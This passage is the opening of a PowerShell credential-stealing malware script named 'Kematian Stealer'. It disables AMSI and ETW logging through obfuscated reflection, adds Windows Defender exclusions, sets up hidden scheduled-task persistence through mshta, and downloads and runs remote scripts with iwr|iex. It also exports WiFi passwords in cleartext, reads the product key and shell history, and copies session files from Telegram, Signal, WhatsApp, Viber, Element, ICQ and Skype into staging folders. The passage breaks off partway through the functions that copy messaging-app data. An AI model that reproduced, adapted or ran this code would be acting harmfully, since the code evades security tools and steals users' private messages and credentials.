#$webhook = "YOUR_URL_HERE_SERVER" 
#$debug = $false
#$blockhostsfile = $false
#$criticalprocess = $false
#$melt = $false
#$fakeerror = $false
#$persistence = $false
#$write_disk_only = $false
#$vm_protect = $false
#$record_mic = $false
#$webcam = $false
#$encryption_key = "YOUR_ENC_KEY_HERE"
[Net.ServicePointManager]::SecurityProtocol = "Tls, Tls11, Tls12, Ssl3"

if ($debug) {
    $ProgressPreference = 'Continue'
}
else {
    $ErrorActionPreference = 'SilentlyContinue'
    $ProgressPreference = 'SilentlyContinue'
}

# Load WPF assemblies
Add-Type -AssemblyName PresentationCore, PresentationFramework, System.Net.Http, System.Windows.Forms, System.Drawing

# Critical Process
function CriticalProcess {
    param ([Parameter(Mandatory = $true)][string]$MethodName, [Parameter(Mandatory = $true)][uint32]$IsCritical, [uint32]$Unknown1, [uint32]$Unknown2)
    [System.Diagnostics.Process]::EnterDebugMode() 
    $domain = [AppDomain]::CurrentDomain
    $name = New-Object System.Reflection.AssemblyName('DynamicAssembly')
    $assembly = $domain.DefineDynamicAssembly($name, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $module = $assembly.DefineDynamicModule('DynamicModule')
    $typeBuilder = $module.DefineType('PInvokeType', 'Public, Class')
    $methodBuilder = $typeBuilder.DefinePInvokeMethod('RtlSetProcessIsCritical', 'ntdll.dll',
        [System.Reflection.MethodAttributes]::Public -bor [System.Reflection.MethodAttributes]::Static -bor [System.Reflection.MethodAttributes]::PinvokeImpl,
        [System.Runtime.InteropServices.CallingConvention]::Winapi, [void], [System.Type[]]@([uint32], [uint32], [uint32]),
        [System.Runtime.InteropServices.CallingConvention]::Winapi,
        [System.Runtime.InteropServices.CharSet]::Ansi)
    $type = $typeBuilder.CreateType()
    $methodInfo = $type.GetMethod('RtlSetProcessIsCritical')
    function InvokeRtlSetProcessIsCritical {
        param ([uint32]$isCritical, [uint32]$unknown1, [uint32]$unknown2)
        $methodInfo.Invoke($null, @($isCritical, $unknown1, $unknown2))
    }
    if ($MethodName -eq 'InvokeRtlSetProcessIsCritical') {
        InvokeRtlSetProcessIsCritical -isCritical $IsCritical -unknown1 $Unknown1 -unknown2 $Unknown2
    }
    else {
        Write-Host "Unknown method name: $MethodName"
    }
}

function KDMUTEX {
    if ($fakeerror) {
        [Windows.Forms.MessageBox]::Show("The program can't start because MSVCP110.dll is missing from your computer. Try reinstalling the program to fix this problem.", '', 'OK', 'Error')
    }
    $AppId = "62088a7b-ae9f-4802-827a-6e9c921cb48e"
    $CreatedNew = $false
    $script:SingleInstanceEvent = New-Object Threading.EventWaitHandle $true, ([Threading.EventResetMode]::ManualReset), "Global\$AppID", ([ref] $CreatedNew)
    if (-not $CreatedNew) {
        throw "[!] An instance of this script is already running."
    }
    elseif ($criticalprocess -and -not $debug) {
        CriticalProcess -MethodName InvokeRtlSetProcessIsCritical -IsCritical 1 -Unknown1 0 -Unknown2 0	
    }
    Invoke-TASKS
}

# Request admin with AMSI bypass and ETW Disable
function CHECK_AND_PATCH {
    ${kematian} = [Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils').GetField('am' + 'siInitFailed', 'NonPublic,Static');
    ${CHaINSki} = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("JGtlbWF0aWFuLlNldFZhbHVlKCRudWxsLCR0cnVlKQ==")) | &([regex]::Unescape("\u0069\u0065\u0078"))
    ([Reflection.Assembly]::LoadWithPartialName((('Sy'+'st'+'em.'+'Core'))).GetType((('System.Diag'+'n'+'o'+'sti'+'cs.Ev'+'e'+'nting'+'.E'+'vent'+'Provi'+'der'))).GetField((('m_en'+'abled')), (('N'+'onP'+'ublic,'+'Instanc'+'e'))).SetValue([Ref].Assembly.GetType((('Syst'+'em.Ma'+'nage'+'ment.Aut'+'om'+'ation.'+'Tra'+'cing.'+'PSEtw'+'LogPr'+'ovider'))).GetField((('etw'+'Prov'+'ider')), (('Non'+'Pub'+'lic,Sta'+'tic'))).GetValue($null), 0))
    $kematiancheck = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
    return $kematiancheck
}

function Invoke-TASKS {
    Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp" -Force
    if ($persistence) {
        Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp" -Force
        Add-MpPreference -ExclusionPath "$env:APPDATA\Kematian" -Force
        $KDOT_DIR = New-Item -ItemType Directory -Path "$env:APPDATA\Kematian" -Force
        $KDOT_DIR.Attributes = "Hidden", "System"
        $task_name = "Kematian"
        $task_action = if ($debug) {
            New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-ExecutionPolicy Bypass -NoProfile -C `"`$webhook='$webhook';`$debug=`$$debug;`$vm_protect=`$$vm_protect;`$encryption_key ='$encryption_key';`$blockhostsfile=`$$blockhostsfile;`$criticalprocess=`$$criticalprocess;`$melt=`$$melt;`$fakeerror=`$$fakeerror;`$persistence=`$$persistence;`$write_disk_only=`$False;`$t = Iwr -Uri 'https://raw.githubusercontent.com/Pirate-Devs/Kematian/main/frontend-src/main.ps1'|iex`""
        }
        else {
            New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$webhook='$webhook';`$debug=`$$debug;`$vm_protect=`$$vm_protect;`$encryption_key ='$encryption_key';`$blockhostsfile=`$$blockhostsfile;`$criticalprocess=`$$criticalprocess;`$melt=`$$melt;`$fakeerror=`$$fakeerror;`$persistence=`$$persistence;`$write_disk_only=`$False;`$t = Iwr -Uri 'https://raw.githubusercontent.com/Pirate-Devs/Kematian/main/frontend-src/main.ps1'|iex`",0)(window.close)"
        }
        $task_trigger = New-ScheduledTaskTrigger -AtLogOn
        $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
        Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "Kematian" -RunLevel Highest -Force | Out-Null
        Write-Host "[!] Persistence Added" -ForegroundColor Green
    }
    if ($blockhostsfile) {
        $link = "https://github.com/Pirate-Devs/Kematian/raw/main/frontend-src/blockhosts.ps1"
        iex (iwr -Uri $link -UseBasicParsing)
    }
    Backup-Data
}

function VMPROTECT {
    $link = ("https://github.com/Pirate-Devs/Kematian/raw/main/frontend-src/antivm.ps1")
    iex (iwr -uri $link -useb)
    Write-Host "[!] NOT A VIRTUALIZED ENVIRONMENT" -ForegroundColor Green
}
if ($vm_protect) {
    VMPROTECT
}

function Request-Admin {
    while (-not (CHECK_AND_PATCH)) {
        if ($PSCommandPath -eq $null) {
            Write-Host "Please run the script with admin!" -ForegroundColor Red
            Start-Sleep -Seconds 5
            Exit 1
        }
        if ($debug -eq $true) {
            try { Start-Process "powershell" -ArgumentList "-NoP -Ep Bypass -File `"$PSCommandPath`"" -Verb RunAs; exit } catch {}
        }
        else {
            try { Start-Process "powershell" -ArgumentList "-Win Hidden -NoP -Ep Bypass -File `"$PSCommandPath`"" -Verb RunAs; exit } catch {}
        } 
    }    
}

function Backup-Data {
    
    Write-Host "[!] Exfiltration in Progress..." -ForegroundColor Green
    $username = $env:USERNAME
    $hostname = $env:COMPUTERNAME
    $uuid = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID
    $timezone = Get-TimeZone
    $offsetHours = $timezone.BaseUtcOffset.Hours
    $timezoneString = "UTC$offsetHours"
    $filedate = Get-Date -Format "yyyy-MM-dd"
    $cc = (Invoke-WebRequest -Uri "https://www.cloudflare.com/cdn-cgi/trace" -useb).Content
    $countrycode = ($cc -split "`n" | ? { $_ -match '^loc=(.*)$' } | % { $Matches[1] })
    $folderformat = "$env:APPDATA\Kematian\$countrycode-($hostname)-($filedate)-($timezoneString)"

    $folder_general = $folderformat
    $folder_messaging = "$folderformat\Messaging Sessions"
    $folder_gaming = "$folderformat\Gaming Sessions"
    $folder_crypto = "$folderformat\Crypto Wallets"
    $folder_vpn = "$folderformat\VPN Clients"
    $folder_email = "$folderformat\Email Clients"
    $important_files = "$folderformat\Important Files"
    $browser_data = "$folderformat\Browser Data"
    $ftp_clients = "$folderformat\FTP Clients"
    $password_managers = "$folderformat\Password Managers" 

    $folders = @($folder_general, $folder_messaging, $folder_gaming, $folder_crypto, $folder_vpn, $folder_email, $important_files, $browser_data, $ftp_clients, $password_managers)
    foreach ($folder in $folders) { if (Test-Path $folder) { Remove-Item $folder -Recurse -Force } }
    $folders | ForEach-Object {
        New-Item -ItemType Directory -Path $_ -Force | Out-Null
    }
    Write-Host "[!] Backup Directories Created" -ForegroundColor Green
	
    function Get-Network {
        $resp = (Invoke-WebRequest -Uri "https://www.cloudflare.com/cdn-cgi/trace" -useb).Content
        $ip = [regex]::Match($resp, 'ip=([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)').Groups[1].Value
        $url = "http://ip-api.com/json"
        $hosting = (Invoke-WebRequest -Uri "http://ip-api.com/line/?fields=hosting" -useb).Content
        $response = Invoke-RestMethod -Uri $url -Method Get
        if (-not $response) {
            return "Not Found"
        }
        $country = $response.country
        $regionName = $response.regionName
        $city = $response.city
        $zip = $response.zip
        $lat = $response.lat
        $lon = $response.lon
        $isp = $response.isp
        return "IP: $ip `nCountry: $country `nRegion: $regionName `nCity: $city `nISP: $isp `nLatitude: $lat `nLongitude: $lon `nZip: $zip `nVPN/Proxy: $hosting"
    }

    $networkinfo = Get-Network
    $lang = (Get-WinUserLanguageList).LocalizedName
    $date = Get-Date -Format "r"
    $osversion = (Get-CimInstance -ClassName Win32_OperatingSystem).Caption
    $windowsVersion = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
    $buildNumber = $windowsVersion.CurrentBuild; $ubR = $windowsVersion.UBR; $osbuild = "$buildNumber.$ubR" 
    $displayversion = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").DisplayVersion
    $mfg = (Get-CimInstance -ClassName Win32_ComputerSystem).Manufacturer
    $model = (Get-CimInstance -ClassName Win32_ComputerSystem).Model
    $CPU = (Get-CimInstance -ClassName Win32_Processor).Name
    $corecount = (Get-CimInstance -ClassName Win32_Processor).NumberOfCores
    $GPU = (Get-CimInstance -ClassName Win32_VideoController).Name
    $total = (Get-CimInstance -ClassName Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum / 1GB
    $raminfo = "{0:N2} GB" -f $total
    $mac = (Get-CimInstance -ClassName Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -eq $true }).MACAddress -join ","
    
    # A cool banner 
    $guid = [Guid]::NewGuid()
    $guidString = $guid.ToString()
    $suffix = $guidString.Substring(0, 8)  
    $prefixedGuid = "Kematian-Stealer-" + $suffix
    $kematian_banner = ("4pWU4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWXDQrilZHilojilojilZcgIOKWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKWiOKVlyAgIOKWiOKWiOKWiOKVlyDilojilojilojilojilojilZcg4paI4paI4paI4paI4paI4paI4paI4paI4pWX4paI4paI4pWXIOKWiOKWiOKWiOKWiOKWiOKVlyDilojilojilojilZcgICDilojilojilZcgICAg4paI4paI4paI4paI4paI4paI4paI4pWX4paI4paI4paI4paI4paI4paI4paI4paI4pWX4paI4paI4paI4paI4paI4paI4paI4pWXIOKWiOKWiOKWiOKWiOKWiOKVlyDilojilojilZcgICAgIOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOKWiOKVlyDilZENCuKVkeKWiOKWiOKVkSDilojilojilZTilZ3ilojilojilZTilZDilZDilZDilZDilZ3ilojilojilojilojilZcg4paI4paI4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4pWa4pWQ4pWQ4paI4paI4pWU4pWQ4pWQ4pWd4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4paI4paI4pWXICDilojilojilZEgICAg4paI4paI4pWU4pWQ4pWQ4pWQ4pWQ4pWd4pWa4pWQ4pWQ4paI4paI4pWU4pWQ4pWQ4pWd4paI4paI4pWU4pWQ4pWQ4pWQ4pWQ4pWd4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4pWRICAgICDilojilojilZTilZDilZDilZDilZDilZ3ilojilojilZTilZDilZDilojilojilZfilZENCuKVkeKWiOKWiOKWiOKWiOKWiOKVlOKVnSDilojilojilojilojilojilZcgIOKWiOKWiOKVlOKWiOKWiOKWiOKWiOKVlOKWiOKWiOKVkeKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVkSAgIOKWiOKWiOKVkSAgIOKWiOKWiOKVkeKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVkeKWiOKWiOKVlOKWiOKWiOKVlyDilojilojilZEgICAg4paI4paI4paI4paI4paI4paI4paI4pWXICAg4paI4paI4pWRICAg4paI4paI4paI4paI4paI4pWXICDilojilojilojilojilojilojilojilZHilojilojilZEgICAgIOKWiOKWiOKWiOKWiOKWiOKVlyAg4paI4paI4paI4paI4paI4paI4pWU4pWd4pWRDQrilZHilojilojilZTilZDilojilojilZcg4paI4paI4pWU4pWQ4pWQ4pWdICDilojilojilZHilZrilojilojilZTilZ3ilojilojilZHilojilojilZTilZDilZDilojilojilZEgICDilojilojilZEgICDilojilojilZHilojilojilZTilZDilZDilojilojilZHilojilojilZHilZrilojilojilZfilojilojilZEgICAg4pWa4pWQ4pWQ4pWQ4pWQ4paI4paI4pWRICAg4paI4paI4pWRICAg4paI4paI4pWU4pWQ4pWQ4pWdICDilojilojilZTilZDilZDilojilojilZHilojilojilZEgICAgIOKWiOKWiOKVlOKVkOKVkOKVnSAg4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4pWRDQrilZHilojilojilZEgIOKWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKVkSDilZrilZDilZ0g4paI4paI4pWR4paI4paI4pWRICDilojilojilZEgICDilojilojilZEgICDilojilojilZHilojilojilZEgIOKWiOKWiOKVkeKWiOKWiOKVkSDilZrilojilojilojilojilZEgICAg4paI4paI4paI4paI4paI4paI4paI4pWRICAg4paI4paI4pWRICAg4paI4paI4paI4paI4paI4paI4paI4pWX4paI4paI4pWRICDilojilojilZHilojilojilojilojilojilojilojilZfilojilojilojilojilojilojilojilZfilojilojilZEgIOKWiOKWiOKVkeKVkQ0K4pWR4pWa4pWQ4pWdICDilZrilZDilZ3ilZrilZDilZDilZDilZDilZDilZDilZ3ilZrilZDilZ0gICAgIOKVmuKVkOKVneKVmuKVkOKVnSAg4pWa4pWQ4pWdICAg4pWa4pWQ4pWdICAg4pWa4pWQ4pWd4pWa4pWQ4pWdICDilZrilZDilZ3ilZrilZDilZ0gIOKVmuKVkOKVkOKVkOKVnSAgICDilZrilZDilZDilZDilZDilZDilZDilZ0gICDilZrilZDilZ0gICDilZrilZDilZDilZDilZDilZDilZDilZ3ilZrilZDilZ0gIOKVmuKVkOKVneKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVneKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVneKVmuKVkOKVnSAg4pWa4pWQ4pWd4pWRDQrilZEgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaHR0cHM6Ly9naXRodWIuY29tL1NvbWFsaS1EZXZzL0tlbWF0aWFuLVN0ZWFsZXIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICDilZENCuKVkSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBSZWQgVGVhbWluZyBhbmQgT2ZmZW5zaXZlIFNlY3VyaXR5ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIOKVkQ0K4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWd")
    $kematian_strings = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($kematian_banner))
    $kematian_info = "$kematian_strings `nLog Name : $hostname `nBuild ID : $prefixedGuid`n"
    
    function Get-Uptime {
        $ts = (Get-Date) - (Get-CimInstance -ClassName Win32_OperatingSystem -ComputerName $computername).LastBootUpTime
        $uptimedata = '{0} days {1} hours {2} minutes {3} seconds' -f $ts.Days, $ts.Hours, $ts.Minutes, $ts.Seconds
        $uptimedata
    }
    $uptime = Get-Uptime

    function Get-InstalledAV {
        $wmiQuery = "SELECT * FROM AntiVirusProduct"
        $AntivirusProduct = Get-WmiObject -Namespace "root\SecurityCenter2" -Query $wmiQuery -EA "Ignore"
        $AntivirusProduct.displayName
    }
    $avlist = Get-InstalledAV | Format-Table | Out-String
    
    $width = (((Get-WmiObject -Class Win32_VideoController).VideoModeDescription -split '\n')[0] -split ' ')[0]
    $height = (((Get-WmiObject -Class Win32_VideoController).VideoModeDescription -split '\n')[0] -split ' ')[2]  
    $split = "x"
    $screen = "$width" + "$split" + "$height"

    $software = Get-ItemProperty "HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" |
    Where-Object { $_.DisplayName -ne $null -and $_.DisplayVersion -ne $null } |
    Select-Object DisplayName, DisplayVersion, Publisher, InstallDate |
    Format-Table -Wrap -AutoSize |
    Out-String

    $network = Get-NetAdapter |
    Select-Object Name, InterfaceDescription, PhysicalMediaType, NdisPhysicalMedium |
    Out-String

    $startupapps = Get-CimInstance Win32_StartupCommand |
    Select-Object Name, Command, Location, User |
    Format-List |
    Out-String

    $runningapps = Get-WmiObject Win32_Process |
    Select-Object Name, Description, ProcessId, ThreadCount, Handles |
    Format-Table -Wrap -AutoSize |
    Out-String

    $services = Get-WmiObject Win32_Service |
    Where-Object State -eq "Running" |
    Select-Object Name, DisplayName |
    Sort-Object Name |
    Format-Table -Wrap -AutoSize |
    Out-String
    
    function diskdata {
        $disks = Get-WmiObject -Class "Win32_LogicalDisk" -Namespace "root\CIMV2" | Where-Object { $_.Size -gt 0 }
        $results = foreach ($disk in $disks) {
            try {
                $SizeOfDisk = [math]::Round($disk.Size / 1GB, 0)
                $FreeSpace = [math]::Round($disk.FreeSpace / 1GB, 0)
                $usedspace = [math]::Round(($disk.Size - $disk.FreeSpace) / 1GB, 2)
                $FreePercent = [int](($FreeSpace / $SizeOfDisk) * 100)
                $usedpercent = [int](($usedspace / $SizeOfDisk) * 100)
            }
            catch {
                $SizeOfDisk = 0
                $FreeSpace = 0
                $FreePercent = 0
                $usedspace = 0
                $usedpercent = 0
            }

            [PSCustomObject]@{
                Drive             = $disk.Name
                "Total Disk Size" = "{0:N0} GB" -f $SizeOfDisk 
                "Free Disk Size"  = "{0:N0} GB ({1:N0} %)" -f $FreeSpace, $FreePercent
                "Used Space"      = "{0:N0} GB ({1:N0} %)" -f $usedspace, $usedpercent
            }
        }
        $results | Where-Object { $_.PSObject.Properties.Value -notcontains '' }
    }
    $alldiskinfo = diskdata -wrap -autosize | Format-List | Out-String
    $alldiskinfo = $alldiskinfo.Trim()

    $info = "$kematian_info`n`n[Network] `n$networkinfo `n[Disk Info] `n$alldiskinfo `n`n[System] `nLanguage: $lang `nDate: $date `nTimezone: $timezoneString `nScreen Size: $screen `nUser Name: $username `nOS: $osversion `nOS Build: $osbuild `nOS Version: $displayversion `nManufacturer: $mfg `nModel: $model `nCPU: $cpu `nCores: $corecount `nGPU: $gpu `nRAM: $raminfo `nHWID: $uuid `nMAC: $mac `nUptime: $uptime `nAntiVirus: $avlist `n`n[Network Adapters] $network `n[Startup Applications] $startupapps `n[Processes] $runningapps `n[Services] $services `n[Software] $software"
    $info | Out-File -FilePath "$folder_general\System.txt" -Encoding UTF8

    Function Get-WiFiInfo {
        $wifidir = "$env:tmp"
        New-Item -Path "$wifidir\wifi" -ItemType Directory -Force | Out-Null
        netsh wlan export profile folder="$wifidir\wifi" key=clear | Out-Null
        $xmlFiles = Get-ChildItem "$wifidir\wifi\*.xml"
        if ($xmlFiles.Count -eq 0) {
            return $false
        }
        $wifiInfo = @()
        foreach ($file in $xmlFiles) {
            [xml]$xmlContent = Get-Content $file.FullName
            $wifiName = $xmlContent.WLANProfile.SSIDConfig.SSID.name
            $wifiPassword = $xmlContent.WLANProfile.MSM.security.sharedKey.keyMaterial
            $wifiAuth = $xmlContent.WLANProfile.MSM.security.authEncryption.authentication
            $wifiInfo += [PSCustomObject]@{
                SSID     = $wifiName
                Password = $wifiPassword
                Auth     = $wifiAuth
            }
        }
        $wifiInfo | Format-Table -AutoSize | Out-String
        $wifiInfo | Out-File -FilePath "$folder_general\WIFIPasswords.txt" -Encoding UTF8
    }
    $wifipasswords = Get-WiFiInfo 
    ri "$env:tmp\wifi" -Recurse -Force

    function Get-ProductKey {
        try {
            $regPath = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform'
            $keyName = 'BackupProductKeyDefault'
            $backupProductKey = Get-ItemPropertyValue -Path $regPath -Name $keyName
            return $backupProductKey
        }
        catch {
            return "No product key found"
        }
    }
    Get-ProductKey > $folder_general\productkey.txt

    Get-Content (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue | Out-File -FilePath "$folder_general\clipboard_history.txt" -Encoding UTF8 

    #------------------#
    #  MESSAGING       #
    #------------------#
    
    # Telegram 
    Write-Host "[!] Session Grabbing Started" -ForegroundColor Green
    function telegramstealer {
        $processname = "telegram"
        $pathtele = "$env:userprofile\AppData\Roaming\Telegram Desktop\tdata"
        if (!(Test-Path $pathtele)) { return }
        $telegramProcess = Get-Process -Name $processname -ErrorAction SilentlyContinue
        if ($telegramProcess) {
            $telegramPID = $telegramProcess.Id; $telegramPath = (gwmi Win32_Process -Filter "ProcessId = $telegramPID").CommandLine.split('"')[1]
            Stop-Process -Id $telegramPID -Force
        }
        $telegramsession = Join-Path $folder_messaging "Telegram"
        New-Item -ItemType Directory -Force -Path $telegramsession | Out-Null
        $items = Get-ChildItem -Path $pathtele
        foreach ($item in $items) {
            if ($item.GetType() -eq [System.IO.FileInfo]) {
                if (($item.Name.EndsWith("s") -and $item.Length -lt 200KB) -or
    ($item.Name.StartsWith("key_data") -or $item.Name.StartsWith("settings") -or $item.Name.StartsWith("configs") -or $item.Name.StartsWith("maps"))) {
                    Copy-Item -Path $item.FullName -Destination $telegramsession -Force 
                }
            }
            elseif ($item.GetType() -eq [System.IO.DirectoryInfo]) {
                if ($item.Name.Length -eq 16) {
                    $files = Get-ChildItem -Path $item.FullName -File             
                    foreach ($file in $files) {
                        if ($file.Name.EndsWith("s") -and $file.Length -lt 200KB) {
                            $destinationDirectory = Join-Path -Path $telegramsession -ChildPath $item.Name
                            if (-not (Test-Path -Path $destinationDirectory -PathType Container)) {
                                New-Item -ItemType Directory -Path $destinationDirectory | Out-Null 
                            }
                            Copy-Item -Path $file.FullName -Destination $destinationDirectory -Force 
                        }
                    }
                }
            }
        }
        try { (Start-Process -FilePath $telegramPath) } catch {}   
    }
    telegramstealer

    # Element  
    function elementstealer {
        $elementfolder = "$env:userprofile\AppData\Roaming\Element"
        if (!(Test-Path $elementfolder)) { return }
        $element_session = "$folder_messaging\Element"
        New-Item -ItemType Directory -Force -Path $element_session | Out-Null
        Copy-Item -Path "$elementfolder\IndexedDB" -Destination $element_session -Recurse -force 
        Copy-Item -Path "$elementfolder\Local Storage" -Destination $element_session -Recurse -force 
    }
    elementstealer

    # ICQ  
    function icqstealer {
        $icqfolder = "$env:userprofile\AppData\Roaming\ICQ"
        if (!(Test-Path $icqfolder)) { return }
        $icq_session = "$folder_messaging\ICQ"
        New-Item -ItemType Directory -Force -Path $icq_session | Out-Null
        Copy-Item -Path "$icqfolder\0001" -Destination $icq_session -Recurse -force 
    }
    icqstealer

    # Signal  
    function signalstealer {
        $signalfolder = "$env:userprofile\AppData\Roaming\Signal"
        if (!(Test-Path $signalfolder)) { return }
        $signal_session = "$folder_messaging\Signal"
        New-Item -ItemType Directory -Force -Path $signal_session | Out-Null
        Copy-Item -Path "$signalfolder\sql" -Destination $signal_session -Recurse -force
        Copy-Item -Path "$signalfolder\attachments.noindex" -Destination $signal_session -Recurse -force
        Copy-Item -Path "$signalfolder\config.json" -Destination $signal_session -Recurse -force
    } 
    signalstealer


    # Viber  
    function viberstealer {
        $viberfolder = "$env:userprofile\AppData\Roaming\ViberPC"
        if (!(Test-Path $viberfolder)) { return }
        $viber_session = "$folder_messaging\Viber"
        New-Item -ItemType Directory -Force -Path $viber_session | Out-Null
        $pattern = "^([\+|0-9][0-9.]{1,12})$"
        $directories = Get-ChildItem -Path $viberfolder -Directory | Where-Object { $_.Name -match $pattern }
        $rootFiles = Get-ChildItem -Path $viberfolder -File | Where-Object { $_.Name -match "(?i)\.db$|\.db-wal$" }
        foreach ($rootFile in $rootFiles) { Copy-Item -Path $rootFile.FullName -Destination $viber_session -Force }    
        foreach ($directory in $directories) {
            $destinationPath = Join-Path -Path $viber_session -ChildPath $directory.Name
            Copy-Item -Path $directory.FullName -Destination $destinationPath -Force        
            $files = Get-ChildItem -Path $directory.FullName -File -Recurse -Include "*.db", "*.db-wal" | Where-Object { -not $_.PSIsContainer }
            foreach ($file in $files) {
                $destinationPathFiles = Join-Path -Path $destinationPath -ChildPath $file.Name
                Copy-Item -Path $file.FullName -Destination $destinationPathFiles -Force
            }
        }
    }
    viberstealer


    # Whatsapp  
    function whatsappstealer {
        $whatsapp_session = "$folder_messaging\Whatsapp"
        New-Item -ItemType Directory -Force -Path $whatsapp_session | Out-Null
        $regexPattern = "^[a-z0-9]+\.WhatsAppDesktop_[a-z0-9]+$"
        $parentFolder = Get-ChildItem -Path "$env:localappdata\Packages" -Directory | Where-Object { $_.Name -match $regexPattern }
        if ($parentFolder) {
            $localStateFolders = Get-ChildItem -Path $parentFolder.FullName -Filter "LocalState" -Recurse -Directory
            foreach ($localStateFolder in $localStateFolders) {
                $profilePicturesFolder = Get-ChildItem -Path $localStateFolder.FullName -Filter "profilePictures" -Recurse -Directory
                if ($profilePicturesFolder) {
                    $destinationPath = Join-Path -Path $whatsapp_session -ChildPath $localStateFolder.Name
                    $profilePicturesDestination = Join-Path -Path $destinationPath -ChildPath "profilePictures"
                    Copy-Item -Path $profilePicturesFolder.FullName -Destination $profilePicturesDestination -Recurse -ErrorAction SilentlyContinue
                }
            }
            foreach ($localStateFolder in $localStateFolders) {
                $filesToCopy = Get-ChildItem -Path $localStateFolder.FullName -File | Where-Object { $_.Length -le 10MB -and $_.Name -match "(?i)\.db$|\.db-wal|\.dat$" }
                $destinationPath = Join-Path -Path $whatsapp_session -ChildPath $localStateFolder.Name
                Copy-Item -Path $filesToCopy.FullName -Destination $destinationPath -Recurse 
            }
        }
    }
    whatsappstealer

    # Skype 
    function skype_stealer {
        $skypefolder = "$env:appdata\microsoft\skype for desktop"
        if (!(Test-Path $skypefolder)) { return }
        $skype_session = "$folder_messaging\Skype"
        New-Item -ItemType Directory -Force -Path $skype_session | Out-Null
        Copy-Item -Path "$skypefolder\Local Storage" -Destination $skype_session -Recurse -force
    }
    skype_stealer
    
    
    # Pidgin 
    function pidgin_stealer {
